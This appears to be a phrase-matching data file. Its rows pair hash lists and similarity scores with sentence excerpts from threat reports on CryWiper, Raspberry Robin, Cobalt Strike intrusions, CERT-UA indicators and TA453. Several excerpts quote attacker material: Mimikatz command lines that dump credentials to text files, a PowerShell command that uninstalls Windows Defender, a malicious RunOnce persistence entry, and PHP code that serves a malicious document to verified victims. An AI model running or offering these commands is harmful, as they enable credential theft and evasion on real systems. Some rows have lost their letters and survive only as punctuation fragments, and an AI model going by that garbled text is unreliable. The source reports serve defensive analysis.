hash|phrase|similarity|adjacent_sentences
301009,7391985,5659146,2187715,2088518,5089880,3636187,2348376,2135509,24883593,1213122,2735714,4178831,20084225,24839444,10123266,20116983,201155,1308400,11100931,11167533,7107049,5523029,2284150,544627,6554218,6778178,652686,11768055,501391,1420929,804298,12064440,11583616,1417254,4223232,4825814,3376723,5003405,336361,409199,3922175,1876738,1835486,476098,3032520,6098157,4742261,761757,2998160,6641501,4555570,9755556,5341031,2150421,2510029,528927,4532923,4963723,5489678,33726,5436771,5198596,1000317,7276398,2743585,2747488,1860708,1681524,6309683,14877871,70665,7797539,819878,4927983,2769788,5926188,3614347,14022079,4853200,1147422,2749725,2895741,328492,20121,2904649,1289023,4298630,4493088,1558249,6973542,7440926,2127403,2743218,496009,2025480,13056231,1807642,12667835,8698696,2997100,4438997,6691849,31182,9429636,6100675,5075920,15355892,5574159,7449918,1583710,13310528,12888295,12542266,2248791,491065,2358382,717401,35307,378587,3169695,2467014,4055496,1685887,333147,2497417,5622346,14681295|RDP traffic|0.7800175804684126|['6/8 ID  CryWiper ,            .', 'ID       ,  ,    ,   .', ':        ,   ID       .', ', CryWiper    ,  ,                  .', 'CryWiper           CryWiper   ,      .', '.', 'CryWiper     IsaaWiper     ,        .', '.', ',      ,    :       (, MD5: 4A42F739CE694DB7B3CDD3C233CE7FB1, 71D9E6EE26D46C4DBB3D8E6DF19DDA7D, 0C6D33DA653230F56A7168E73F1448AC).', '-    Trojan-Ransom.Win32.Xorist,          Trojan-Ransom.MSIL.Agent.', ',   ,    2017 .']
301009,7391985,5659146,2187715,2088518,5089880,3636187,2348376,2135509,24883593,1213122,2735714,4178831,20084225,24839444,10123266,20116983,201155,1308400,11100931,11167533,7107049,5523029,2284150,544627,6554218,6778178,652686,11768055,501391,1420929,804298,12064440,11583616,1417254,4223232,4825814,3376723,5003405,336361,409199,3922175,1876738,1835486,476098,3032520,6098157,4742261,761757,2998160,6641501,4555570,9755556,5341031,2150421,2510029,528927,4532923,4963723,5489678,33726,5436771,5198596,1000317,7276398,2743585,2747488,1860708,1681524,6309683,14877871,70665,7797539,819878,4927983,2769788,5926188,3614347,14022079,4853200,1147422,2749725,2895741,328492,20121,2904649,1289023,4298630,4493088,1558249,6973542,7440926,2127403,2743218,496009,2025480,13056231,1807642,12667835,8698696,2997100,4438997,6691849,31182,9429636,6100675,5075920,15355892,5574159,7449918,1583710,13310528,12888295,12542266,2248791,491065,2358382,717401,35307,378587,3169695,2467014,4055496,1685887,333147,2497417,5622346,14681295|RDP traffic|0.7800175804684126|['CryWiper  ,       ,   .', '.exe C:\\\\Windows .dll tmp .lnk winnt .sys temp .msi thumb .CRY System Volume Information Boot Windows Trend Micro        .CRY.', '5/8 ,    .', ',             IsaacWiper.', ',        .', ',       .', ', IsaacWiper        ,  CryWiper,     ,     .', ',    CryWiper        README.txt   .', ',     Bitcoin-   ,        ID .', '6/8 ID  CryWiper ,            .', 'ID       ,  ,    ,   .']
343527,90031,174508,984460,498956,323430,4555,247849,151626,87497,335772,123193,468532,13272,492091,503004,93406,17538,208285,259937,80811,73975,1611909,13135,243448,459262,469835,728536,184883,124548,182985,26021,169664,84786,302769,1636339,146407,981,1645,981057,409199,372356,765685,375921,90091,374832,712372,345611,384837,104738,722340,149879,121750,7738,1895969,141975,30521,236218,25505,222670,13854,217470,813503,487565,218153,251505,246513,639507,8876,183524,195297,234740,45432,591719,74041,234682,9885,64200,60243,38438,496690,553847,590341,328492,20121,866000,22125,40291,24933,352058,703304,313635,17410,801320,39083,533702,821891,458436,146228,369870,535066,15112,276700,31182,570690,330314,215432,93028,165376,448529,880033,380314,461927,45760,515072,28927,276460,717401,35307,1478979,672499,261936,40879,31406,106385,501201,663968,1865445|RDP traffic|0.7800175804684126|['-        -     .', 'Hi-Tech Crime Trends                  ,    - ,    .', 'Hi-Tech Crime Trends   -,   - , SOC-,     ,           .', 'Hi-Tech Crime Trends   -      ,          ,    .', 'Group-IB   ,    ,        -       -     .', '.', 'Group-IB:   ,    ,     Leaks   ,    ,            ,    ,    ,    Group-IB     ,    ,         ,     ,     ,     GROUP-IB.RU   6     Group-IB       Hi-Tech Crime Trends,                           .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response  Digital Risk Protection.', 'Group-IB                       , ,   - .', ',     Group-IB        ,          .', ',  -  -     .']
11610127,5809941,9024081,15210281,11583688,7829423,4657716,7828329,899812,9551880,6151563,1616244,3183692,5305712,1886773,20716391,990259,1320109,7302970,4377575,9301350,1205391,29740262,9409594,3610172,3819200,7518371,3005961,7428125,7405309,1316104,9378073,5909220,4486055,4399676,22598478,1245632,13066885,5087106,10679662,985167,12780733,3428830,1004199,5298848,517,897695,3755172,61146,4317814,1390237,1413392,10246386,11660676,16043503,1166550,23865476,395549,6611691,2275113,14878825,826623,1273891,8089399,17242752,23458859,3148072,1110301,348674,1346686,2275668,1901374,3303848,6787830,20588532,7382911,21526573,1715290,16325462,3407996,25861665,99339,24766906,16904922,8841244,8072599,7407812,5288579,14056191,9202375,1649566,11016179,23401976,12167856,315309,5229812,2837940,2578852,3522355,3962925,16609344,7047935,311872,3875328,584465,1543963,22239969,1634069,16833897,3674981,8198026,10426529,1957091,534305,15882741,13391128,3207842,9219250,3862701,21117730,4687087,2485405,6067163,16653158,7125488,1832243,432061,4773609|loads it using rundll32|0.812022029607377|"[']re pointing to a QNAP compromised device as seen in the Cybereason Defense PlatformExtract from https://www.shodan.io/host/195.158.67.252, showing that the server that resolves from 6y[.', ']re is a QNAP device with a service hosted on TCP port 8080Spread Through Process InjectionThe next step for this threat is to inject itself into other processes, namely rundll32.exe, dllhost.exe and regsvr32.exe on the observed victims.', 'The Cybereason Defense Platform detects this injection and can help to link the creator process and the created ones.The number of injected system processes is generally high (between 50 and 300) and some of these processes communicate with TOR (The Onion Router) exit nodes:Raspberry Robin injecting system processes, which then communicate with TOR-related IP addresses, as seen in the Cybereason Defense PlatformPersistenceRaspberry Robin installs itself into a registry run key in the Windows users hive, for example:Hku\\\\[GUID]\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\runonce\\\\vayp with value RUNDLL32 SHELL32.DLL,ShellExec_RunDLLA REGSVR32.EXE /u -S ""C:\\\\Users\\\\[UserName]\\\\AppData\\\\Local\\\\Temp\\\\cnsbi.mh.', '""As a result, rundll32.exe loads the same DLL as the one which the initial msiexec.exe process downloaded in the infection stage.', 'It then proceeds with the same process injection and communication as described above.The loaded DLL has a random extension (pi.loc, cr.mf, etc.)', 'and rundll32.exe loads it with a .', 'at the end:Process tree showing the persistence mechanisms used by Raspberry Robin as seen in the Cybereason Defense PlatformRegarding the persistence aspects, the following diagram represents the way the malicious module executes at each machine startup:Raspberry Robin persistence process following an initial infection and running at each machine bootAs the malicious module is the same one as during the initial infection process, it displays the same malicious activities involving process injection and communication with Tor exit nodes.This module contains specific indicators, including the fact that it masquerades as an Apache shared library (DLL) called libapriconv-1.dll:Raspberry Robin leverages malicious module loading masquerading as Apache shared libraries (DLL)The other samples the GSOC team identified on other Raspberry Robin cases also use different masquerading processes (for instance, impersonating QT 5).This specific module is also peculiar due to the fact that the chain of certification is broken, making it signed but not verified by the Windows system.', 'The code signing name is OmniContact and can be used as a filter on VirusTotal.com to check for similar samples.Excerpt from virustotal.com showing a sample detailed informationIn 75% of the observed victims, the malicious module downloaded by Raspberry Robin was signed by OmniContact.Network CommunicationsFinally, the victim devices of Raspberry Robin created a high amount of network packets to TOR exit nodes.', 'The GSOC team observed that the TCP ports used were 80, 443 and 8080.Cybereason RecommendationsTheCybereason Defense Platformdetects and prevents Raspberry Robin infections in Microsoft products.', 'Cybereason recommends the following:Block outgoing connections (outside of the organization) to TOR-related addresses, as Raspberry Robin actively communicates with TOR exit nodes.As Raspberry Robin displays persistence mechanisms and establishes many masquerading actions on the infected system, re-image infected devices.Threat Hunting with Cybereason: The Cybereason MDR team provides its customers with custom hunting queries for detecting specific threats - to find out more about threat hunting andManaged Detection and Responsewith the Cybereason Defense Platform,contact a Cybereason Defender here.For Cybereason customers: More detailsavailable on the NESTincluding custom threat hunting queries for detecting this threat:The Cybereason Defense Platform detects Raspberry Robin initial access methodThe Cybereason Defense Platform detects the Raspberry Robin malicious module loadingIndicators of Compromise (IOCs)Looking for the IOCs?', 'Open the chatbot on the bottom right corner of your screen to access the Raspberry Robin IOCs.About the ResearcherLoc Castel, Principal Security Analyst, Cybereason Global SOCLoc Castel is a Principal Security Analyst with the Cybereason Global SOC team.']"
1964486,1033239,1758059,450901,1088257,7829423,3848942,527077,338166,804024,1538528,343617,2414282,2251667,2440497,271858,357181,304913,2898306,477735,288236,1863982,2457974,890618,1566651,451836,5872238,4389065,1153342,775400,3764233,804298,3816870,3345264,3660100,528793,1765567,904925,1106148,344061,1666378,2000634,6560213,1728119,1994469,3946721,140586,1300803,2821754,194618,1812632,1924962,765979,5542685,1386429,1166550,2139499,3677828,9400657,5130651,1235269,432082,1073414,2059839,4365656,2793059,2093404,827645,1169998,1346686,3837077,221891,3735816,2363179,2502913,539955,371040,15136890,2198457,430228,3648570,10158467,649370,1807896,4380254,492915,2612595,879758,506880,2969492,1357031,72937,2304875,3492989,315309,5229812,1073040,1017184,310578,2561521,26927,2448746,276700,604917,3878689,201862,267488,1634069,1104755,914881,2743013,1192114,1250663,2299945,1509448,618453,1391243,1529333,3862701,708645,1661892,82201,276705,579733,333147,9516134,6416480,62944|The injection is also visible from memory dumps|0.9743441787695135|"['Such access can be tracked with Sysmon event ID 10 (ProcessAccess).', 'As explained inthis blog written by Jonathan JOHNSON, opening a handle to WinLogon in order to duplicate the token and call ImpersonateLoggedOnUser is a known Cobalt Strike technique.ZeroLogonOn the second day of the intrusion, a spike in NetLogon traffic was observed from the beachhead host to a domain controller.', 'This traffic then triggered several network signatures for CVE-2020-1472 otherwise known as ZeroLogon.ET EXPLOIT Possible Zerologon Phase 1/3 - NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472)  ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1  ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472)The event logs corroborated a successful exploitation with a password update Event 4742 for one of the Domain Controller passwords.Mark-of-the-Web BypassThe threat actors delivered the initial malware as a zip file, with the contents of a ISO file, which contained their payload to gain access to the target environment.', 'These packages are designed to evade controls such as Mark-of-the-Web restrictions.Windows Defender tamperingOn one host, the threat actors ran the following command to try and clear the way for their activity, likely due to the difficulty the threat actors were having with beacons crashing.powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUIThis command was downloaded from a remote site to a file named pon!.txt and then executed locally.Process injectionMultiple suspicious calls to the function CreateRemoteThread (Sysmon Event ID 8) were observed.', 'This is a known behavior of Cobalt Strike and its function shinject, which can be used to inject a new beacon or a specific program to another process on the victims computer.As a result, we observed abnormal winlogon.exe process behavior; winlogon.exe performed DNS requests (Sysmon event ID 22) to a Cobalt Strike C2 domain guteyutu[.', ']com.The injection is also visible from memory dumps.', 'Several hosts showed rundll32 processes exhibiting common process injection behavior, where the MZ file header is seen in the starting memory address in rundll32 processes with PAGE_EXECUTE_READWRITE permissions.Many of these beacons could also be detected in memory scanning with theMalpedia Cobalt Strikerule.', 'A sample of a scanning run is displayed below:HostProcess IDProcess NameCommand LineYara RuleSERVERA568winlogon.exewinlogon.exewin_cobalt_strike_autoSERVERA4284RuntimeBroker.exeC:\\\\Windows\\\\System32\\\\RuntimeBroker.exe -Embeddingwin_cobalt_strike_autoSERVERB9936rundll32.exeC:\\\\Windows\\\\syswow64\\\\rundll32.exewin_cobalt_strike_autoBEACHHEAD996svchost.exeC:\\\\Windows\\\\system32\\\\svchost.exe -k DcomLaunch -p -s LSMwin_cobalt_strike_autoBEACHHEAD1888svchost.exeC:\\\\Windows\\\\System32\\\\svchost.exe -k LocalSystemNetworkRestricted -p -s AudioEndpointBuilderwin_cobalt_strike_autoBEACHHEAD2220winlogon.exewinlogon.exewin_cobalt_strike_autoBEACHHEAD7032rundll32.exeC:\\\\Windows\\\\syswow64\\\\rundll32.exewin_cobalt_strike_autoSERVERC3328rundll32.exeC:\\\\Windows\\\\syswow64\\\\rundll32.exewin_cobalt_strike_autoMultiple tools and scripts were used to access and collect credentials from compromised hosts.', 'There were several variants of Mimikatz in binary and PowerShell form:""C:\\\\ProgramData\\\\mimikatz.exe""  ""C:\\\\ProgramData\\\\mimikatz.exe.exe""  ""C:\\\\ProgramData\\\\mimikatz_cryptovanniy.exe""  ""C:\\\\ProgramData\\\\notepad.exe"" ""C:\\\\ProgramData\\\\katz.ps1Commands used to collect credentials and export to text files stored in the C:\\\\ProgramData folder included the following:C:\\\\Windows\\\\system32\\\\cmd.exe /C mimikatz.exe ""privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"" >> c:\\\\programdata\\\\mimikatz\\\\creds.txt  C:\\\\Windows\\\\system32\\\\cmd.exe /C mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump::hashes exit > ""c:\\\\programdata\\\\creds.txt""  C:\\\\Windows\\\\system32\\\\cmd.exe powershell -ep bypass -C ""import-module .\\\\katz.ps1;Invoke-Katz"" > mimi.txtDCSyncCredentials were also dumped via DCSync using two compromised high privilege accounts.', 'The activity was observed in Windows Security Event ID 4662, with known indicators including non-computer based account, an access mask of 0x100, and object IDs.1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 - DS-Replication-Get-Changes-All  1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 - DS-Replication-Get-ChangesDCSync was observed across 12 events, with separate events for each object ID.', 'It is likely the operator used the Cobalt Strike DCSync command, having observed them already enter this directly in the host OS command shell.For additional details,SpecterOps has an article covering the DCSync technique.Code injection in LSASSMultiple injections into the LSASS process were observed on multiple hosts.Threat actors used the function CreateRemoteThread in order to inject malicious code in LSASS process to access credentials.Process dump of the LSASS process was undertaken using the Sysinternals ProcDump utility:This process was invoked by RunDLL32.exe which was an injected Cobalt Strike beacon reaching out to the command and control server at 111.90.143[.']"
343527,90031,174508,984460,498956,323430,4555,247849,151626,87497,335772,123193,468532,13272,492091,503004,93406,17538,208285,259937,80811,73975,1611909,13135,243448,459262,469835,728536,184883,124548,182985,26021,169664,84786,302769,1636339,146407,981,1645,981057,409199,372356,765685,375921,90091,374832,712372,345611,384837,104738,722340,149879,121750,7738,1895969,141975,30521,236218,25505,222670,13854,217470,813503,487565,218153,251505,246513,639507,8876,183524,195297,234740,45432,591719,74041,234682,9885,64200,60243,38438,496690,553847,590341,328492,20121,866000,22125,40291,24933,352058,703304,313635,17410,801320,39083,533702,821891,458436,146228,369870,535066,15112,276700,31182,570690,330314,215432,93028,165376,448529,880033,380314,461927,45760,515072,28927,276460,717401,35307,1478979,672499,261936,40879,31406,106385,501201,663968,1865445|an injected Cobalt Strike beacon|0.8295960768918719|['-        -     .', 'Hi-Tech Crime Trends                  ,    - ,    .', 'Hi-Tech Crime Trends   -,   - , SOC-,     ,           .', 'Hi-Tech Crime Trends   -      ,          ,    .', 'Group-IB   ,    ,        -       -     .', '.', 'Group-IB:   ,    ,     Leaks   ,    ,            ,    ,    ,    Group-IB     ,    ,         ,     ,     ,     GROUP-IB.RU   6     Group-IB       Hi-Tech Crime Trends,                           .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response  Digital Risk Protection.', 'Group-IB                       , ,   - .', ',     Group-IB        ,          .', ',  -  -     .']
12239544,42477388,20785458,18857281,8261830,49362922,10181278,31091323,6121576,1346399,10057624,377576,12543106,1927242,2191306,14104549,29727828,12286001,1778191,4845708,38388171,935452,25785369,18903240,42358606,51988145,52283984,58467981,13615350,20413438,4171892,58550075,14115038,17018631,50112140,8343534,10440235,4535310,12110763,7615092,3010340,5316228,50223822,2333171,6010487,33570936,68917954,4425146,72009198,7664541,14312252,78484231,4557630,3395891,54766789,31886290,2974092,52705260,35235424,2641287,19091519,7788124,10760342,87854102,4847410,4197627,11135143,11438663,25472574,4967208,6781277,1095627,4698184,28663919,3472034,14481640,30514254,9111523,1741751,51788896,1042346,11531143,18925185,9443577,3093273,15517028,25482190,18245040,10020186,938707,11518305,27846473,22777158,23694175,24940311,10947772,25767089,22979805,24315324,16234985,7168670,47402058,5005203,20075109,6788277,6925046,712772,14527039,40768824,75140205,3280464,9859215,7172064,1968579,6158509,139142,31261817,717401,11609582,19398886,15566461,49825073,23208476,292654,67564384,20901718,1408353,11133519|an injected Cobalt Strike beacon|0.8295960768918719|"['cert.gov.ua /article/39708         """"    Cobalt Strike Beacon (CERT-UA#4490)  :         CERT-UA        ""!', '!  ""', 'XLS- ""  .xls"",   .', ',   ,       ""pe.dll"".     \'', 'Cobalt Strike Beacon.', ',   ""pe.dll"",  ,    ""spisok.exe""   CERT-UA#4464,    ,      TrickBot.', 'UAC-0098.', ': : 877f834e8788d05b625ba639b9318512 ea9dae45f81fe3527c62ad7b84b03d19629014b1a0e346b6aa933e52b0929d8a   .xls e28ac0f94df75519a60ecc860475e6b3 9990fe0d8aac0b4a6040d5979afd822c2212d9aec2b90e5d10c0b15dee8d61b1 pe.dll (2022-04-15) a3534cc24a76fa81ce38676027de9533 39a868e84524669491d6a251264144f0bfaca4f664d3fd10151854c341077262 shellcode.bin.packed.dll eb18207d505a1de30af6c7baafd28e8e ff30fdd64297ac41937f9a018753871fee0e888844fbcf7bf92bf5f8d6f57090 notevil.dll (CS Beacon) : hxxp://138[.', ']68.229.0/pe.dll hxxps://dezword[.', ']com/apiv8/getStatus 1/3hxxps://dezword[.']"
37848030,99978479,43682355,2076167,8261830,98834396,19510539,8565017,54730443,52785401,102843602,152595775,21934643,133398089,27291475,23395222,2059713,25474716,24876277,817977,19663443,3517752,14167499,15132145,28886397,13800456,28719053,102279721,17802795,10326556,31048715,44872585,18392240,17018631,47084252,8343534,1339175,54939959,45831842,3655868,17702999,10216664,3428830,995323,38044172,145306949,32088926,4425146,19976252,7664541,90798466,5366194,4557630,91723384,25025104,44907422,5256238,1478516,46931886,53764039,3476897,7401609,4338506,164043121,56312852,37073144,18795442,79505368,67210193,40297347,9717336,763147,91041531,124305820,56277970,29586389,23135469,61750644,1741751,5660609,51749289,11531143,1384264,2494725,78986008,3831141,5710811,31564380,85730093,39019965,16997644,32651398,2117320,138122215,25322954,47939684,40410938,49370740,136168898,9325406,47095231,28057085,22710750,44126592,41682665,41291429,14164673,24583789,43082769,11496647,53229670,150560590,4907878,9959135,44463238,28031760,76474386,717401,104263557,98055207,60540916,1260316,30472370,12384794,117614736,6483101,31848375,240703454|an injected Cobalt Strike beacon|0.8295960768918719|"['cert.gov.ua /article/38155          Cobalt Strike Beacon (CERT-UA#4227)          Cobalt Strike Beacon (CERT-UA#4227)           CERT-UA  RAR-  "".rar"",   RAR- "" 21.03.rar"", ,   ,  SFX- "" filercs.rar"" (   \'   right-to-left override (RTLO) ).', ',   VBScript- (Thumbs.db),      .NET- ""dhdhk0k34.com"".   \'', 'Cobalt Strike Beacon.', ',     ""inject.exe"" - 15.03.2022  ,    VBScript-,         UAC-0051 (unc1151/GhostWriter).', 'MD5 SHA256   e4b54ee2f0068762179e7e514d90bf16 fbabc4e5a6470606fc64c39c182b5a7a71f8fa96f50c67725d52abf184f75fd4 .rar 4a78df33d4f987103dc0c0f3a302b8cb 59ed536e1955e310f321435d43ca8b60cb3746514f3c3ea951d43633cacbe7bc  21.03.rar bcdab4ae622811f699765bfb9cb909d2 6149680c8541980d46c17681e37e4751e2baca1d13ee648b8188dfb24bf56f7c  file rcs.rar b5525108912ee8d5f1519f1b552723e8 d324d7f30984931176ff878a81c7c1f4f979ad3d759c7f33427bba10d9deb1f6 Thumbs.db 3303286735a07ae5d14db9c12843d44e f98e1e61c84a5ed098e7481ab339e2881195f4d1b101c92b81113eb7ff56e63d dhdhk0k34.com 18e73cc3d5eda742530ba3fef59e3943 1/237e644deee0add76bac9c5121355a03a459b1a97917383765bf3df94e9af7e29 Skype.exe b724ff750dff495e6634ddf0f1263844 7cf3f758b2abb303dec89736dfd55c38309a21aec2d83d3d4e590f9538fc5f15 inject.exe (2022-03-15) 1365b82e7da0968e97c095d8bd9166dd c14fce93183dc4173be02b2a48d1ed06b43656c7b6d5a290d9948b6947df9033 csbeacon.bin (Cobalt Strike Beacon)  hXXps://ao3.hmgo[.', ']pw/tags/Akihabara@TODEEP/works hXXps://ao3.hmgo[.', ']pw/tags/Akihabara@TODEEP/works/update ao3.hmgo[.', ']pw hmgo[.']"
3749336,6312089,7831100,2276120,8933226,3313211,4801307,6144349,4780417,3186336,3134393,2265186,4084812,13920403,72134,362962,2059713,1789214,975573,12165448,926882,3305930,2459582,942065,1830157,1778695,5712905,2566108,851826,1050064,12431795,3249485,1349237,6339394,450747,2587443,82460,2362921,2462503,348963,5403292,1668431,3428830,1299409,5053353,967380,140586,1300803,2602209,1596347,1390237,10030682,1878297,2453835,18991821,557991,6891446,395549,63342,4241349,2470016,2652027,513213,1556670,745699,1051758,4558620,7145808,10875213,5844343,3837077,213014,4044356,3877934,12069165,3347983,2370444,442481,12156992,430228,1099248,629887,188841,3459705,4293020,6602712,2049772,18668,2396794,1450932,3050165,6647124,2854923,884047,3120861,3317543,9904138,5325171,4064833,1242531,4995228,2617524,11205384,4338778,5910747,1145344,626106,532848,915435,3674981,8198026,6290379,1250663,962275,1816445,110577,178743,1528127,4634206,989728,936754,7209941,2925602,4241466,333147,2809997,7918453,1083979|host,|0.8482594500282106|"['Using this IP validation scheme, the actor verifies whether the incoming request is from the victim or not.', '6.', 'On top of that, the operator relies on several other processes to carefully deliver the next payload such as checking OS type and predefined user-agent strings.', '2/14C2 server structure C2 script (download.php) for malicious document delivery As a result of analyzing the server-side script to convey a malicious document, we figured out how this actor verifies the request from the client and minimizes exposure of their payload.', 'This script works with a specific parameter name from the victim, so we suspect the actor delivers a download link to the victim via email or by sending a request using another type of payload.', '1.', 'It checks the who GET parameter from the victim.', 'The who parameter contains an email address without a domain name.', '1 if (isset($_GET[\'who\']) && $_GET[\'who\'] == ""[redacted]"") # Check \'who\' parameter value 2 { 3 4 $vbs_server = ""weworld59.myartsonline.com""; # The next stage server 5 $virus = ""v.doc""; # Malicious document 6 $unvirus = ""un.doc""; # Benign document 7 $downname = ""CV.DHOM Alexandra Siddall (Korean).doc""; # Delivered file name 8 9 $who = $_GET[\'who\']; 10 $down = $who .', '"".txt""; 3/142.', 'If the incoming request contains an expected email address, it saves the date, IP address and user-agent to the [who]_downhistory.txt file.']"
2580654,2248874,9024081,450901,873742,7829423,4497868,9575149,4306682,14317160,20590194,17470031,8799657,6129716,2130868,4605955,3409682,3703720,975573,2399050,14347939,10994991,644771,6522511,2099453,3834772,4488304,8874972,4139590,86363,24768969,1348367,21692183,6952233,4133651,8248936,3361707,2362921,6368704,18861538,9160776,6127997,6687197,1004199,3168497,5564078,1771774,7393917,19333371,18891594,2018402,4965337,2031412,11295245,879874,96633,6187497,4780987,3512306,4953182,1696547,3402600,4568008,4073796,1047396,8767110,3148072,3197507,11670372,193085,1077609,221891,2036564,7301415,2603040,10901896,11452209,25369199,5537863,1081391,4427134,629887,6244249,12633242,8841244,3805910,2058915,2738404,137354,24582402,2390469,2809443,2304875,2054637,2335768,1468993,2283994,5450561,3814559,8858669,2278521,2200313,3500605,5037274,10664629,1543963,858057,1634069,7342023,3674981,2212147,1803642,1754978,3457816,3662869,2273975,221657,1529333,2760698,820007,7805551,2718998,1622103,3258300,4112576,13573814,6509699,62944|host,|0.8421570472356291|"['Similar to the document sent by ""Harald,"" this document also used remote template injection to download Korg.', ""KorgTA453's Latest Remote Template Injection As noted above, some of TA453's campaigns delivered OneDrive links that hosted malicious documents."", 'The documents are the latest version of the TA453 remote template injection documents discussed by 6/8PwC in July 2022.', 'The password protected documents downloaded the macro enabled template documents from 354pstw4a5f8.filecloudonline[.]com.', 'Proofpoint observed multiple campaigns reusing that specific filecloudonline[.', ']com host.', 'The downloaded template, dubbed Korg by Proofpoint, has three macros: Module1.bas, Module2.bas, and ThisDocument.cls.', ""The macros collect information such as username, list of running processes along with the user's public IP from my-ip.io and then exfiltrates that information using the Telegram API."", 'At this time, Proofpoint has only observed the beaconing information and has not observed any follow-on exploitation capabilities.', 'The lack of code execution or command and control capabilities within the TA453 macros is abnormal.', 'Proofpoint judges that infected users may be subject to additional exploitation based on the software identified on their machines.']"
